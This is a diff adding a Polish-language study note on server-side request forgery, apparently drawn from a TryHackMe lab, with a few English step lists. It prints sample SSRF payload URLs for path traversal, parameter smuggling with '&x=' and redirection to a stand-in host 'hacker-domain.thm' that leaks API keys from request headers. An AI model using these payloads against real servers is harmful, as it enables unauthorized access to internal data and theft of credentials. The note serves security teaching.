@@ -1,0 +1,70 @@
+Czym jest SSRF, jaki może mieć wpływ, kilka przykładowych ataków, SSF, jak możesz odkryć luki w zabezpieczeniach SSRF, jak obejść reguły wprowadzania danych.
+    Co to jest SSRF?
+SSRF oznacza fałszerstwo żądań po stronie serwera. Jest to luka, która pozwla, złośliwemu użytkownikowi spowodować, że serwer WWW, wyśle dodatkowe lub 
+zmodyfikowane żądanie HTTP do zasobu wybranego przez atakującego.
+    Rodzje SSRF
+Istnieją dwa rodzaje podatności SSRF; pierwszy to zwykły SSRF, w którym dane są zwracane na ekranie atakującego. Druga to luka Blind SSRF, w ktorej występuje SSRF
+ale żadne informacje nie są zwracane na ekranie atakującego.
+  Jaki jest wpływ?
+Udany atak SSRF może spowodować:
+  ╠ Dostęp do niedozwolonych obszarów.
+  ╠ Dostęp do danych klienta/organizacji.
+  ╠ Możliwość skalowania do sieci wewnętrznych.
+  ╠ Ujawnienie tokenów/poświadczeń uwierzytelniający.
+
+Przykłady SSRF:
+
+Poniższy przykład pokazuje, w jaki sposób osoba atakująca może mieć pełną kontrolę nad stroną żądaną przez serwer WWW.
+Osoba atakująca może zmodyfikować obszar zaznaczony kreską pionową | na wybrany przez siebie adres URL. 
+
+    ╠ http://website.thm/stock?url=|/http://api.website.thm/api/stock/item?id=123|
+
+1. Hacker requests:
+  ╠ http://website.thm/stock?url=http://api.website.thm/api/user
+2. Website Requests:
+  ╠ http://api.website.thm/api/user
+3. API Server returns user data to the website instead of stock information
+4. Website returns user data to Hacker
+
+
+Poniższy przykład pokazuje, w jaki sposób osoba atakująca może nadal dotrzeć do strony /api/user, mając kontrolę tylko nad ścieżka, korzystając z przeglądania
+katalogów.
+
+    ╠ http://website.thm/stock?url=|/item?id=123|
+
+1. Hacker requests:
+  ╠ http://websiste.thm/stock?url=/../user
+2. Website Requests:
+  ╠ http://api.website.thm/api/stock/../user
+3. API Server returns user data to the website instead of stock information.
+4. Websiste returns user data to Hacker.
+
+
+W tym przykładzie osoba atakująca może kontrolować subdomenę serwera, do której kierowane jest żądanie. Zwróć uwagę, że ładunek kończący się na &x= jest używany
+do powstrzymania dołączania pozostałej ścieżki na końcu adresu URL atakującego i zamiast tego zameinia go w parametr (?x=) w ciągu zapytnia.
+
+    ╠ http://website.thm/stock?server=|api&id=|123|
+    
+1. Hacker requests:
+  ╠ http://website.thm/stock?server=api.website.thm/api/user&x=&id=123
+2. Website Requests 
+  ╠ http://api.websiste.thm/api/user?x=/website.thm/api/stock/item?id=123
+3. API Server returns user data to the website instead of stock information.
+4.Website returns user data to Hacker.
+
+Wracając do pierwotnego żądania, atakujący może zamiast tego zmusić serwer WWW do zażądania serwera wybranego przez atakującego. W ten sposób może przechwycić 
+nagłówki żądań wysłane do określonej domeny atakującego. Te nagłówki mogą zawierać poświadczenia uwierzytelniające lub klucze API wysłane przez website.thm
+(które normlanie uwierzytelniają się w api.websiste.thm)
+
+   ╠ http://website.thm/stock?url=|/http://api.website.thm/api/stock/item?id=123|
+
+1. Hacker requests:
+  ╠ http://website.thm/stock?url=http://hacker-domain.thm/
+2. Website Requests data form hacker-domain.thm instead of api.website.thm revealing the API Key.
+  
+
+
+
+
+
+
